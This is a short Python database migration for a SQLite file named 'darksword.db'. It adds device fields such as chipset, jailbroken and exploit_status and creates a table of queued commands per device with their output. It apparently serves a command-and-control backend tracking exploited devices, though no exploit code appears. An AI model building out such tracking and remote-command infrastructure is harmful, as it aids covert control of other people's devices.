from sqlalchemy import create_engine, text
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent
db_path = str(PROJECT_ROOT / 'darksword.db')
DATABASE_URL = 'sqlite:///' + db_path
engine = create_engine(DATABASE_URL, connect_args={'check_same_thread': False})

with engine.connect() as conn:
    cols = ['os_version VARCHAR(50)', 'device_model VARCHAR(100)', 'chipset VARCHAR(100)', "jailbroken VARCHAR(10) DEFAULT 'unknown'", "exploit_status VARCHAR(20) DEFAULT 'pending'", 'last_command_time DATETIME']
    for col in cols:
        try:
            conn.execute(text('ALTER TABLE devices ADD COLUMN ' + col))
            print('Added: ' + col)
        except:
            print('Exists: ' + col)
    conn.commit()

    try:
        conn.execute(text('CREATE TABLE IF NOT EXISTS commands (id INTEGER PRIMARY KEY AUTOINCREMENT, device_uuid VARCHAR(100) NOT NULL, command TEXT NOT NULL, status VARCHAR(20) DEFAULT "pending", output TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP, executed_at DATETIME)'))
        print('Created commands table')
    except:
        print('Commands table exists')
    conn.commit()

print('Done')
